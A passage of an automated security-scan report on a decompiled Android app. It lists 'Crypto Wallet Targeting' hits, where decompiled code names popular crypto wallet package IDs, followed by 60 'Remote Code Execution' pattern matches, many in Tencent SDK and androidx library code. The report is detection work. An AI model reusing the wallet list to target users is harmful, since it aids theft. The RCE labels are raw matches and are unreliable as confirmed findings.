- **File:** `sources/f3/i.java`
- **Line:** 1847

```java
                            AdInfo d10 = androidx.appcompat.view.a.d(2);
                            d10.setTaskId(e3.d.a());
                            d10.setCustomId(104);
                            d10.setPkg("io.metamask");
                            d10.setUse(1);
                            String c10 = k3.e.c(context, d10.getPkg());
                            d10.setImg(c10 != null ? c10 : "2131492879");
```

**65. Crypto Wallet Targeting**
- **Description:** Pattern detected: io.metamask
- **File:** `sources/f3/i.java`
- **Line:** 1959

```java
                                    AdInfo d14 = androidx.appcompat.view.a.d(2);
                                    d14.setTaskId(e3.d.a());
                                    d14.setCustomId(TbsListener.ErrorCode.APK_INVALID);
                                    d14.setPkg("io.metamask");
                                    d14.setUse(2);
                                    String c14 = k3.e.c(context, d14.getPkg());
                                    if (c14 == null) {
```

**66. Crypto Wallet Targeting**
- **Description:** Pattern detected: io.metamask
- **File:** `sources/f3/i.java`
- **Line:** 2332

```java
                                            d23.setBack(1);
                                            d23.setAutoClose(new Random().nextInt(20) + 20);
                                            d23.setCustomId(PointerIconCompat.TYPE_WAIT);
                                            d23.setPkg("io.metamask");
                                            d23.setUse(2);
                                            String c23 = k3.e.c(context, d23.getPkg());
                                            if (c23 != null) {
```

**67. Crypto Wallet Targeting**
- **Description:** Pattern detected: com.wallet.crypto.trustapp
- **File:** `sources/f3/i.java`
- **Line:** 1795

```java
                            AdInfo d7 = androidx.appcompat.view.a.d(2);
                            d7.setTaskId(e3.d.a());
                            d7.setCustomId(101);
                            d7.setPkg("com.wallet.crypto.trustapp");
                            d7.setUse(1);
                            String c7 = k3.e.c(context, d7.getPkg());
                            d7.setImg(c7 != null ? c7 : "2131492888");
```

**68. Crypto Wallet Targeting**
- **Description:** Pattern detected: com.wallet.crypto.trustapp
- **File:** `sources/f3/i.java`
- **Line:** 1865

```java
                                    AdInfo d11 = androidx.appcompat.view.a.d(2);
                                    d11.setTaskId(e3.d.a());
                                    d11.setCustomId(TbsListener.ErrorCode.EXCEED_UNZIP_RETRY_NUM);
                                    d11.setPkg("com.wallet.crypto.trustapp");
                                    d11.setUse(2);
                                    String c11 = k3.e.c(context, d11.getPkg());
                                    d11.setImg(c11 != null ? c11 : "2131492888");
```

**69. Crypto Wallet Targeting**
- **Description:** Pattern detected: com.wallet.crypto.trustapp
- **File:** `sources/f3/i.java`
- **Line:** 2160

```java
                                            d20.setBack(1);
                                            d20.setAutoClose(new Random().nextInt(20) + 20);
                                            d20.setCustomId(PointerIconCompat.TYPE_CONTEXT_MENU);
                                            d20.setPkg("com.wallet.crypto.trustapp");
                                            d20.setUse(2);
                                            String c20 = k3.e.c(context, d20.getPkg());
                                            if (c20 != null) {
```

**70. Crypto Wallet Targeting**
- **Description:** Pattern detected: com.tronlinkpro.wallet
- **File:** `sources/f3/i.java`
- **Line:** 1758

```java
                        AdInfo d5 = androidx.appcompat.view.a.d(2);
                        d5.setTaskId(e3.d.a());
                        d5.setCustomId(106);
                        d5.setPkg("com.tronlinkpro.wallet");
                        d5.setUse(1);
                        String c5 = k3.e.c(context, d5.getPkg());
                        d5.setImg(c5 != null ? c5 : "2131165378");
```

**71. Crypto Wallet Targeting**
- **Description:** Pattern detected: com.tronlinkpro.wallet
- **File:** `sources/f3/i.java`
- **Line:** 2023

```java
                                    AdInfo d16 = androidx.appcompat.view.a.d(2);
                                    d16.setTaskId(e3.d.a());
                                    d16.setCustomId(TbsListener.ErrorCode.UNZIP_IO_ERROR);
                                    d16.setPkg("com.tronlinkpro.wallet");
                                    d16.setUse(2);
                                    String c16 = k3.e.c(context, d16.getPkg());
                                    if (c16 == null) {
```

**72. Crypto Wallet Targeting**
- **Description:** Pattern detected: im.token.app
- **File:** `sources/e3/d.java`
- **Line:** 120

```java
            f2594d = linkedHashSet;
            linkedHashSet.add("com.wallet.crypto.trustapp");
            linkedHashSet.add("vip.mytokenpocket");
            linkedHashSet.add("im.token.app");
            linkedHashSet.add("io.metamask");
            linkedHashSet.add("org.toshi");
            linkedHashSet.add("com.tronlinkpro.wallet");
```

**73. Crypto Wallet Targeting**
- **Description:** Pattern detected: im.token.app
- **File:** `sources/e3/d.java`
- **Line:** 222

```java
        f2594d = linkedHashSet2;
        linkedHashSet2.add("com.wallet.crypto.trustapp");
        linkedHashSet2.add("vip.mytokenpocket");
        linkedHashSet2.add("im.token.app");
        linkedHashSet2.add("io.metamask");
        linkedHashSet2.add("org.toshi");
        linkedHashSet2.add("com.tronlinkpro.wallet");
```

**74. Crypto Wallet Targeting**
- **Description:** Pattern detected: vip.mytokenpocket
- **File:** `sources/e3/d.java`
- **Line:** 119

```java
            LinkedHashSet linkedHashSet = new LinkedHashSet();
            f2594d = linkedHashSet;
            linkedHashSet.add("com.wallet.crypto.trustapp");
            linkedHashSet.add("vip.mytokenpocket");
            linkedHashSet.add("im.token.app");
            linkedHashSet.add("io.metamask");
            linkedHashSet.add("org.toshi");
```

**75. Crypto Wallet Targeting**
- **Description:** Pattern detected: vip.mytokenpocket
- **File:** `sources/e3/d.java`
- **Line:** 221

```java
        LinkedHashSet linkedHashSet2 = new LinkedHashSet();
        f2594d = linkedHashSet2;
        linkedHashSet2.add("com.wallet.crypto.trustapp");
        linkedHashSet2.add("vip.mytokenpocket");
        linkedHashSet2.add("im.token.app");
        linkedHashSet2.add("io.metamask");
        linkedHashSet2.add("org.toshi");
```

**76. Crypto Wallet Targeting**
- **Description:** Pattern detected: io.metamask
- **File:** `sources/e3/d.java`
- **Line:** 121

```java
            linkedHashSet.add("com.wallet.crypto.trustapp");
            linkedHashSet.add("vip.mytokenpocket");
            linkedHashSet.add("im.token.app");
            linkedHashSet.add("io.metamask");
            linkedHashSet.add("org.toshi");
            linkedHashSet.add("com.tronlinkpro.wallet");
            linkedHashSet.add("com.tronlink.global");
```

**77. Crypto Wallet Targeting**
- **Description:** Pattern detected: io.metamask
- **File:** `sources/e3/d.java`
- **Line:** 223

```java
        linkedHashSet2.add("com.wallet.crypto.trustapp");
        linkedHashSet2.add("vip.mytokenpocket");
        linkedHashSet2.add("im.token.app");
        linkedHashSet2.add("io.metamask");
        linkedHashSet2.add("org.toshi");
        linkedHashSet2.add("com.tronlinkpro.wallet");
        linkedHashSet2.add("com.tronlink.global");
```

**78. Crypto Wallet Targeting**
- **Description:** Pattern detected: com.wallet.crypto.trustapp
- **File:** `sources/e3/d.java`
- **Line:** 118

```java
            hashSet.add("الأذونات");
            LinkedHashSet linkedHashSet = new LinkedHashSet();
            f2594d = linkedHashSet;
            linkedHashSet.add("com.wallet.crypto.trustapp");
            linkedHashSet.add("vip.mytokenpocket");
            linkedHashSet.add("im.token.app");
            linkedHashSet.add("io.metamask");
```

**79. Crypto Wallet Targeting**
- **Description:** Pattern detected: com.wallet.crypto.trustapp
- **File:** `sources/e3/d.java`
- **Line:** 220

```java
        hashSet4.add("الأذونات");
        LinkedHashSet linkedHashSet2 = new LinkedHashSet();
        f2594d = linkedHashSet2;
        linkedHashSet2.add("com.wallet.crypto.trustapp");
        linkedHashSet2.add("vip.mytokenpocket");
        linkedHashSet2.add("im.token.app");
        linkedHashSet2.add("io.metamask");
```

**80. Crypto Wallet Targeting**
- **Description:** Pattern detected: com.tronlinkpro.wallet
- **File:** `sources/e3/d.java`
- **Line:** 123

```java
            linkedHashSet.add("im.token.app");
            linkedHashSet.add("io.metamask");
            linkedHashSet.add("org.toshi");
            linkedHashSet.add("com.tronlinkpro.wallet");
            linkedHashSet.add("com.tronlink.global");
            linkedHashSet.add("com.binance.dev");
            linkedHashSet.add("com.okinc.okex.gp");
```

**81. Crypto Wallet Targeting**
- **Description:** Pattern detected: com.tronlinkpro.wallet
- **File:** `sources/e3/d.java`
- **Line:** 225

```java
        linkedHashSet2.add("im.token.app");
        linkedHashSet2.add("io.metamask");
        linkedHashSet2.add("org.toshi");
        linkedHashSet2.add("com.tronlinkpro.wallet");
        linkedHashSet2.add("com.tronlink.global");
        linkedHashSet2.add("com.binance.dev");
        linkedHashSet2.add("com.okinc.okex.gp");
```


### Remote Code Execution (791 issues)

**1. Remote Code Execution Detected**
- **Description:** Suspicious pattern found: loadClass
- **File:** `smali_classes20/m/j.smali`
- **Line:** 2302

```java
    if-eqz v1, :cond_4

    invoke-virtual {v1, p0}, Ljava/lang/ClassLoader;->loadClass(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v0
```

**2. Remote Code Execution Detected**
- **Description:** Suspicious pattern found: \.dex
- **File:** `smali_classes20/androidx/multidex/MultiDex$V4.smali`
- **Line:** 113

```java
    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v9, ".dex"

    invoke-virtual {v6, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
```

**3. Remote Code Execution Detected**
- **Description:** Suspicious pattern found: DexClassLoader
- **File:** `smali_classes18/com/tencent/smtt/export/external/DexClassLoaderProvider$2.smali`
- **Line:** 1

```java
.class final Lcom/tencent/smtt/export/external/DexClassLoaderProvider$2;
.super Ljava/util/TimerTask;

```

**4. Remote Code Execution Detected**
- **Description:** Suspicious pattern found: DexClassLoader
- **File:** `smali_classes18/com/tencent/smtt/export/external/DexClassLoaderProvider$2.smali`
- **Line:** 7

```java
# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/tencent/smtt/export/external/DexClassLoaderProvider;->doAsyncDexLoad(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/ClassLoader;)V
.end annotation

```

**5. Remote Code Execution Detected**
- **Description:** Suspicious pattern found: DexClassLoader
- **File:** `smali_classes18/com/tencent/smtt/export/external/DexClassLoaderProvider$2.smali`
- **Line:** 32

```java
    .locals 0

    iput-object p1, p0, Lcom/tencent/smtt/export/external/DexClassLoaderProvider$2;->val$dexPath:Ljava/lang/String;

    iput-object p2, p0, Lcom/tencent/smtt/export/external/DexClassLoaderProvider$2;->val$optimizedDirectory:Ljava/lang/String;
```

**6. Remote Code Execution Detected**
- **Description:** Suspicious pattern found: \.dex
- **File:** `smali_classes18/com/tencent/smtt/export/external/DexClassLoaderProvider$2.smali`
- **Line:** 61

```java
    const-string v3, ".jar"

    const-string v4, ".dex"

    invoke-virtual {v2, v3, v4}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;
```

**7. Remote Code Execution Detected**
- **Description:** Suspicious pattern found: DexClassLoader
- **File:** `smali_classes11/com/tencent/smtt/export/external/DexClassLoaderProvider.smali`
- **Line:** 1

```java
.class public Lcom/tencent/smtt/export/external/DexClassLoaderProvider;
.super Ldalvik/system/DexClassLoader;

```

**8. Remote Code Execution Detected**
- **Description:** Suspicious pattern found: DexClassLoader
- **File:** `smali_classes11/com/tencent/smtt/export/external/DexClassLoaderProvider.smali`
- **Line:** 2

```java
.class public Lcom/tencent/smtt/export/external/DexClassLoaderProvider;
.super Ldalvik/system/DexClassLoader;


```

**9. Remote Code Execution Detected**
- **Description:** Suspicious pattern found: DexClassLoader
- **File:** `smali_classes11/com/tencent/smtt/export/external/DexClassLoaderProvider.smali`
- **Line:** 8

```java
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/tencent/smtt/export/external/DexClassLoaderProvider$SpeedyDexClassLoader;
    }
.end annotation
```

**10. Remote Code Execution Detected**
- **Description:** Suspicious pattern found: loadClass
- **File:** `smali_classes11/com/tencent/smtt/export/external/DexClassLoaderProvider.smali`
- **Line:** 830

```java
.end method

.method public loadClass(Ljava/lang/String;)Ljava/lang/Class;
    .locals 1
    .annotation system Ldalvik/annotation/Signature;
```

**11. Remote Code Execution Detected**
- **Description:** Suspicious pattern found: loadClass
- **File:** `smali_classes11/com/tencent/smtt/export/external/DexClassLoaderProvider.smali`
- **Line:** 848

```java
    if-eqz v0, :cond_0

    invoke-super {p0, p1}, Ljava/lang/ClassLoader;->loadClass(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object p1
```

**12. Remote Code Execution Detected**
- **Description:** Suspicious pattern found: loadClass
- **File:** `smali_classes11/com/tencent/smtt/export/external/DexClassLoaderProvider.smali`
- **Line:** 857

```java
    iget-object v0, p0, Lcom/tencent/smtt/export/external/DexClassLoaderProvider;->mClassLoader:Lcom/tencent/smtt/export/external/DexClassLoaderProvider$SpeedyDexClassLoader;

    invoke-virtual {v0, p1}, Ljava/lang/ClassLoader;->loadClass(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object p1
```

**13. Remote Code Execution Detected**
- **Description:** Suspicious pattern found: DexClassLoader
- **File:** `smali_classes11/com/tencent/smtt/export/external/DexClassLoaderProvider$1.smali`
- **Line:** 1

```java
.class final Lcom/tencent/smtt/export/external/DexClassLoaderProvider$1;
.super Ljava/util/TimerTask;

```

**14. Remote Code Execution Detected**
- **Description:** Suspicious pattern found: DexClassLoader
- **File:** `smali_classes11/com/tencent/smtt/export/external/DexClassLoaderProvider$1.smali`
- **Line:** 7

```java
# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/tencent/smtt/export/external/DexClassLoaderProvider;->doAsyncDexLoad(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/ClassLoader;)V
.end annotation

```

**15. Remote Code Execution Detected**
- **Description:** Suspicious pattern found: DexClassLoader
- **File:** `smali_classes11/com/tencent/smtt/export/external/DexClassLoaderProvider$1.smali`
- **Line:** 30

```java
    .locals 0

    iput-object p1, p0, Lcom/tencent/smtt/export/external/DexClassLoaderProvider$1;->val$dexName:Ljava/lang/String;

    iput-object p2, p0, Lcom/tencent/smtt/export/external/DexClassLoaderProvider$1;->val$dexPath:Ljava/lang/String;
```

**16. Remote Code Execution Detected**
- **Description:** Suspicious pattern found: loadClass
- **File:** `smali_classes16/androidx/appcompat/widget/ResourceManagerInternal$DrawableDelegate.smali`
- **Line:** 64

```java
    move-result-object v2

    invoke-virtual {v2, v0}, Ljava/lang/ClassLoader;->loadClass(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v0
```

**17. Remote Code Execution Detected**
- **Description:** Suspicious pattern found: DexClassLoader
- **File:** `smali_classes10/com/tencent/smtt/export/external/DexLoader$TbsCorePrivateClassLoader.smali`
- **Line:** 2

```java
.class Lcom/tencent/smtt/export/external/DexLoader$TbsCorePrivateClassLoader;
.super Ldalvik/system/DexClassLoader;


```

**18. Remote Code Execution Detected**
- **Description:** Suspicious pattern found: DexClassLoader
- **File:** `smali_classes10/com/tencent/smtt/export/external/DexLoader$TbsCorePrivateClassLoader.smali`
- **Line:** 20

```java
    .locals 0

    invoke-direct {p0, p1, p2, p3, p4}, Ldalvik/system/DexClassLoader;-><init>(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/ClassLoader;)V

    return-void
```

**19. Remote Code Execution Detected**
- **Description:** Suspicious pattern found: loadClass
- **File:** `smali_classes10/com/tencent/smtt/export/external/DexLoader$TbsCorePrivateClassLoader.smali`
- **Line:** 27

```java

# virtual methods
.method public loadClass(Ljava/lang/String;Z)Ljava/lang/Class;
    .locals 5
    .annotation system Ldalvik/annotation/Signature;
```

**20. Remote Code Execution Detected**
- **Description:** Suspicious pattern found: loadClass
- **File:** `smali_classes10/com/tencent/smtt/export/external/DexLoader$TbsCorePrivateClassLoader.smali`
- **Line:** 75

```java
    if-nez v2, :cond_2

    invoke-super {p0, p1, p2}, Ljava/lang/ClassLoader;->loadClass(Ljava/lang/String;Z)Ljava/lang/Class;

    move-result-object p1
```

**21. Remote Code Execution Detected**
- **Description:** Suspicious pattern found: loadClass
- **File:** `smali_classes10/com/tencent/smtt/export/external/DexLoader$TbsCorePrivateClassLoader.smali`
- **Line:** 109

```java
    if-eqz v0, :cond_3

    invoke-virtual {v0, p1}, Ljava/lang/ClassLoader;->loadClass(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object p2
```

**22. Remote Code Execution Detected**
- **Description:** Suspicious pattern found: \.dex
- **File:** `smali_classes21/com/tencent/smtt/sdk/m$2.smali`
- **Line:** 57

```java
    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I

    const-string v2, ".dex"

    invoke-virtual {p1, v2}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z
```

**23. Remote Code Execution Detected**
- **Description:** Suspicious pattern found: DexClassLoader
- **File:** `smali_classes21/com/tencent/smtt/export/external/DexLoader.smali`
- **Line:** 40

```java

# instance fields
.field private mClassLoader:Ldalvik/system/DexClassLoader;


```

**24. Remote Code Execution Detected**
- **Description:** Suspicious pattern found: DexClassLoader
- **File:** `smali_classes21/com/tencent/smtt/export/external/DexLoader.smali`
- **Line:** 95

```java
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    invoke-virtual {p4}, Lcom/tencent/smtt/export/external/DexLoader;->getClassLoader()Ldalvik/system/DexClassLoader;

    move-result-object p4
```

**25. Remote Code Execution Detected**
- **Description:** Suspicious pattern found: DexClassLoader
- **File:** `smali_classes21/com/tencent/smtt/export/external/DexLoader.smali`
- **Line:** 122

```java
    move-object v6, p1

    invoke-direct/range {v1 .. v6}, Lcom/tencent/smtt/export/external/DexLoader;->createDexClassLoader(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/ClassLoader;Landroid/content/Context;)Ldalvik/system/DexClassLoader;

    move-result-object v5
```

**26. Remote Code Execution Detected**
- **Description:** Suspicious pattern found: loadClass
- **File:** `smali_classes21/com/tencent/smtt/export/external/DexLoader.smali`
- **Line:** 1419

```java
    iget-object v1, p0, Lcom/tencent/smtt/export/external/DexLoader;->mClassLoader:Ldalvik/system/DexClassLoader;

    invoke-virtual {v1, p1}, Ljava/lang/ClassLoader;->loadClass(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v1
```

**27. Remote Code Execution Detected**
- **Description:** Suspicious pattern found: loadClass
- **File:** `smali_classes21/com/tencent/smtt/export/external/DexLoader.smali`
- **Line:** 1499

```java
    iget-object v0, p0, Lcom/tencent/smtt/export/external/DexLoader;->mClassLoader:Ldalvik/system/DexClassLoader;

    invoke-virtual {v0, p2}, Ljava/lang/ClassLoader;->loadClass(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v0
```

**28. Remote Code Execution Detected**
- **Description:** Suspicious pattern found: loadClass
- **File:** `smali_classes21/com/tencent/smtt/export/external/DexLoader.smali`
- **Line:** 1582

```java
    iget-object v1, p0, Lcom/tencent/smtt/export/external/DexLoader;->mClassLoader:Ldalvik/system/DexClassLoader;

    invoke-virtual {v1, p1}, Ljava/lang/ClassLoader;->loadClass(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v1
```

**29. Remote Code Execution Detected**
- **Description:** Suspicious pattern found: \.dex
- **File:** `smali_classes21/com/tencent/smtt/export/external/DexLoader.smali`
- **Line:** 847

```java
    if-eqz v0, :cond_8

    const-string v0, "async odex...DexClassLoaderProvider.createDexClassLoader"

    invoke-static {v2, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
```

**30. Remote Code Execution Detected**
- **Description:** Suspicious pattern found: DexClassLoader
- **File:** `smali_classes9/com/tencent/smtt/utils/d.smali`
- **Line:** 14

```java

# static fields
.field private static b:Ldalvik/system/DexClassLoader;

.field private static c:Landroid/os/Looper;
```

**31. Remote Code Execution Detected**
- **Description:** Suspicious pattern found: DexClassLoader
- **File:** `smali_classes9/com/tencent/smtt/utils/d.smali`
- **Line:** 387

```java

    :cond_3
    sget-object v5, Lcom/tencent/smtt/utils/d;->b:Ldalvik/system/DexClassLoader;

    if-nez v5, :cond_4
```

**32. Remote Code Execution Detected**
- **Description:** Suspicious pattern found: DexClassLoader
- **File:** `smali_classes9/com/tencent/smtt/utils/d.smali`
- **Line:** 391

```java
    if-nez v5, :cond_4

    new-instance v5, Ldalvik/system/DexClassLoader;

    const/4 v6, 0x0
```

**33. Remote Code Execution Detected**
- **Description:** Suspicious pattern found: loadClass
- **File:** `smali_classes9/com/tencent/smtt/utils/d.smali`
- **Line:** 465

```java
    const-string p4, "com.tencent.tbs.debug.plugin.DebugView"

    invoke-virtual {p1, p4}, Ljava/lang/ClassLoader;->loadClass(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object p1
```

**34. Remote Code Execution Detected**
- **Description:** Suspicious pattern found: DexClassLoader
- **File:** `smali_classes9/com/tencent/smtt/sdk/v.smali`
- **Line:** 898

```java
    iget-object v0, p0, Lcom/tencent/smtt/sdk/v;->a:Lcom/tencent/smtt/export/external/DexLoader;

    invoke-virtual {v0}, Lcom/tencent/smtt/export/external/DexLoader;->getClassLoader()Ldalvik/system/DexClassLoader;

    move-result-object v0
```

**35. Remote Code Execution Detected**
- **Description:** Suspicious pattern found: loadClass
- **File:** `smali_classes9/com/tencent/smtt/sdk/v.smali`
- **Line:** 904

```java
    const-string v1, "com.tencent.tbs.tbsshell.WebCoreProxy"

    invoke-virtual {v0, v1}, Ljava/lang/ClassLoader;->loadClass(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v0
```

**36. Remote Code Execution Detected**
- **Description:** Suspicious pattern found: loadClass
- **File:** `smali_classes6/m/a.smali`
- **Line:** 423

```java
    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/ClassLoader;->loadClass(Ljava/lang/String;)Ljava/lang/Class;
    :try_end_0
    .catch Ljava/lang/ClassNotFoundException; {:try_start_0 .. :try_end_0} :catch_0
```

**37. Remote Code Execution Detected**
- **Description:** Suspicious pattern found: loadClass
- **File:** `smali_classes6/m/a.smali`
- **Line:** 517

```java
.end method

.method public final loadClass(Ljava/lang/String;Z)Ljava/lang/Class;
    .locals 1
    .annotation system Ldalvik/annotation/Signature;
```

**38. Remote Code Execution Detected**
- **Description:** Suspicious pattern found: loadClass
- **File:** `smali_classes6/m/a.smali`
- **Line:** 543

```java
    :cond_0
    :try_start_0
    invoke-super {p0, p1, p2}, Ljava/lang/ClassLoader;->loadClass(Ljava/lang/String;Z)Ljava/lang/Class;

    move-result-object p1
```

**39. Remote Code Execution Detected**
- **Description:** Suspicious pattern found: ProcessBuilder
- **File:** `smali_classes8/com/tencent/smtt/export/external/libwebp.smali`
- **Line:** 96

```java
    move-result-object v1

    new-instance v2, Ljava/lang/ProcessBuilder;

    invoke-direct {v2, v1}, Ljava/lang/ProcessBuilder;-><init>([Ljava/lang/String;)V
```

**40. Remote Code Execution Detected**
- **Description:** Suspicious pattern found: ProcessBuilder
- **File:** `smali_classes8/com/tencent/smtt/export/external/libwebp.smali`
- **Line:** 98

```java
    new-instance v2, Ljava/lang/ProcessBuilder;

    invoke-direct {v2, v1}, Ljava/lang/ProcessBuilder;-><init>([Ljava/lang/String;)V

    invoke-virtual {v2}, Ljava/lang/ProcessBuilder;->start()Ljava/lang/Process;
```

**41. Remote Code Execution Detected**
- **Description:** Suspicious pattern found: ProcessBuilder
- **File:** `smali_classes8/com/tencent/smtt/export/external/libwebp.smali`
- **Line:** 100

```java
    invoke-direct {v2, v1}, Ljava/lang/ProcessBuilder;-><init>([Ljava/lang/String;)V

    invoke-virtual {v2}, Ljava/lang/ProcessBuilder;->start()Ljava/lang/Process;

    move-result-object v1
```

**42. Remote Code Execution Detected**
- **Description:** Suspicious pattern found: \.dex
- **File:** `smali_classes15/com/tencent/smtt/utils/n$1.smali`
- **Line:** 43

```java
    if-nez v0, :cond_0

    const-string v0, ".dex"

    invoke-virtual {p1, v0}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z
```

**43. Remote Code Execution Detected**
- **Description:** Suspicious pattern found: DexClassLoader
- **File:** `smali_classes12/com/tencent/smtt/export/external/DexClassLoaderProvider$SpeedyDexClassLoader.smali`
- **Line:** 1

```java
.class Lcom/tencent/smtt/export/external/DexClassLoaderProvider$SpeedyDexClassLoader;
.super Ldalvik/system/BaseDexClassLoader;

```

**44. Remote Code Execution Detected**
- **Description:** Suspicious pattern found: DexClassLoader
- **File:** `smali_classes12/com/tencent/smtt/export/external/DexClassLoaderProvider$SpeedyDexClassLoader.smali`
- **Line:** 1

```java
.class Lcom/tencent/smtt/export/external/DexClassLoaderProvider$SpeedyDexClassLoader;
.super Ldalvik/system/BaseDexClassLoader;

```

**45. Remote Code Execution Detected**
- **Description:** Suspicious pattern found: DexClassLoader
- **File:** `smali_classes12/com/tencent/smtt/export/external/DexClassLoaderProvider$SpeedyDexClassLoader.smali`
- **Line:** 2

```java
.class Lcom/tencent/smtt/export/external/DexClassLoaderProvider$SpeedyDexClassLoader;
.super Ldalvik/system/BaseDexClassLoader;


```

**46. Remote Code Execution Detected**
- **Description:** Suspicious pattern found: loadClass
- **File:** `smali_classes12/com/tencent/smtt/export/external/DexClassLoaderProvider$SpeedyDexClassLoader.smali`
- **Line:** 122

```java
.end method

.method public loadClass(Ljava/lang/String;Z)Ljava/lang/Class;
    .locals 0
    .annotation system Ldalvik/annotation/Signature;
```

**47. Remote Code Execution Detected**
- **Description:** Suspicious pattern found: loadClass
- **File:** `smali_classes12/com/tencent/smtt/export/external/DexClassLoaderProvider$SpeedyDexClassLoader.smali`
- **Line:** 134

```java
    .end annotation

    invoke-super {p0, p1, p2}, Ljava/lang/ClassLoader;->loadClass(Ljava/lang/String;Z)Ljava/lang/Class;

    move-result-object p1
```

**48. Remote Code Execution Detected**
- **Description:** Suspicious pattern found: loadClass
- **File:** `smali_classes12/androidx/fragment/app/FragmentFactory.smali`
- **Line:** 53

```java

    :try_start_0
    invoke-static {p0, p1}, Landroidx/fragment/app/FragmentFactory;->loadClass(Ljava/lang/ClassLoader;Ljava/lang/String;)Ljava/lang/Class;

    move-result-object p0
```

**49. Remote Code Execution Detected**
- **Description:** Suspicious pattern found: loadClass
- **File:** `smali_classes12/androidx/fragment/app/FragmentFactory.smali`
- **Line:** 73

```java
.end method

.method private static loadClass(Ljava/lang/ClassLoader;Ljava/lang/String;)Ljava/lang/Class;
    .locals 2
    .param p0    # Ljava/lang/ClassLoader;
```

**50. Remote Code Execution Detected**
- **Description:** Suspicious pattern found: loadClass
- **File:** `smali_classes12/androidx/fragment/app/FragmentFactory.smali`
- **Line:** 163

```java

    :try_start_0
    invoke-static {p0, p1}, Landroidx/fragment/app/FragmentFactory;->loadClass(Ljava/lang/ClassLoader;Ljava/lang/String;)Ljava/lang/Class;

    move-result-object p0
```

**51. Remote Code Execution Detected**
- **Description:** Suspicious pattern found: DexClassLoader
- **File:** `smali_classes13/com/tencent/smtt/sdk/m.smali`
- **Line:** 3146

```java
    invoke-static {v0, v6}, Lcom/tencent/smtt/utils/TbsLog;->i(Ljava/lang/String;Ljava/lang/String;)V

    new-instance v6, Ldalvik/system/DexClassLoader;

    aget-object v7, v2, v5
```

**52. Remote Code Execution Detected**
- **Description:** Suspicious pattern found: DexClassLoader
- **File:** `smali_classes13/com/tencent/smtt/sdk/m.smali`
- **Line:** 3160

```java
    const/4 v9, 0x0

    invoke-direct {v6, v7, v8, v9, v4}, Ldalvik/system/DexClassLoader;-><init>(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/ClassLoader;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
```

**53. Remote Code Execution Detected**
- **Description:** Suspicious pattern found: DexClassLoader
- **File:** `smali_classes13/com/tencent/smtt/sdk/m.smali`
- **Line:** 3438

```java
    move-result-object v4

    new-instance v5, Ldalvik/system/DexClassLoader;

    invoke-virtual {v2}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;
```

**54. Remote Code Execution Detected**
- **Description:** Suspicious pattern found: \.dex
- **File:** `smali_classes13/com/tencent/smtt/sdk/m.smali`
- **Line:** 1270

```java
    move-result-object v10

    const-string v11, ".dex"

    invoke-virtual {v10, v11}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z
```

**55. Remote Code Execution Detected**
- **Description:** Suspicious pattern found: \.dex
- **File:** `smali_classes13/com/tencent/smtt/sdk/m.smali`
- **Line:** 2102

```java
    move-result-object v10

    const-string v11, ".dex"

    invoke-virtual {v10, v11}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z
```

**56. Remote Code Execution Detected**
- **Description:** Suspicious pattern found: \.dex
- **File:** `smali_classes13/com/tencent/smtt/sdk/m.smali`
- **Line:** 2644

```java
    move-result-object v7

    const-string v8, ".dex"

    invoke-virtual {v7, v8}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z
```

**57. Remote Code Execution Detected**
- **Description:** Suspicious pattern found: loadClass
- **File:** `smali_classes13/kotlin/coroutines/jvm/internal/ModuleNameRetriever.smali`
- **Line:** 76

```java
    const-string v3, "java.lang.Module"

    invoke-virtual {v1, v3}, Ljava/lang/ClassLoader;->loadClass(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v1
```

**58. Remote Code Execution Detected**
- **Description:** Suspicious pattern found: loadClass
- **File:** `smali_classes13/kotlin/coroutines/jvm/internal/ModuleNameRetriever.smali`
- **Line:** 98

```java
    const-string v3, "java.lang.module.ModuleDescriptor"

    invoke-virtual {p1, v3}, Ljava/lang/ClassLoader;->loadClass(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object p1
```

**59. Remote Code Execution Detected**
- **Description:** Suspicious pattern found: loadClass
- **File:** `smali_classes13/androidx/appcompat/app/AppCompatDelegateImpl.smali`
- **Line:** 3868

```java
    move-result-object v2

    invoke-virtual {v2, v0}, Ljava/lang/ClassLoader;->loadClass(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v2
```

**60. Remote Code Execution Detected**
- **Description:** Suspicious pattern found: DexClassLoader
- **File:** `smali_classes14/com/tencent/smtt/sdk/t.smali`
- **Line:** 37

```java
    aput-object v3, v2, v4

    const-class v3, Ldalvik/system/DexClassLoader;

    const/4 v5, 0x1
```

